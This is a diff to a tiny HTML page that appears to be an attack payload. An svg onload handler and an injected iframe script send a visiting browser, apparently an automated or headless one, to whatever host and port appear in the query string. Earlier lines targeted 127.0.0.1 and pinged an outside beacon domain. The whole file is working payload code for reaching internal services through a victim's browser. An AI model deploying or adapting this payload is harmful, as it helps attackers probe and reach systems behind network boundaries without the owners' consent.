@@ -2,9 +2,14 @@
 <head>
 </head>
 <body>
-  <svg/onload="l=location;if(l.search){a=l.search.split('?')[1].split('=');h=a[0];p=a[1]};location=`http://${host}:${port}`">
-  <iframe src=http://127.0.0.1>
-	<img src='http://s.srcb.fun/noresponse'>
+  <svg/onload="l=location;if(l.search){a=l.search.split('?')[1].split('=');h=a[0];p=a[1]};location=`http://${h}:${p}`">
+  <script>
+	f=document.createElement('iframe');
+	l=location;if(l.search){a=l.search.split('?')[1].split('=');h=a[0];p=a[1]};
+	f.src = `http://${h}:${p}`;
+	document.body.appendChild(f);
+  </script>
+<!--<img src='http://s.srcb.fun/noresponse'>-->
 </body>
 
 </html>
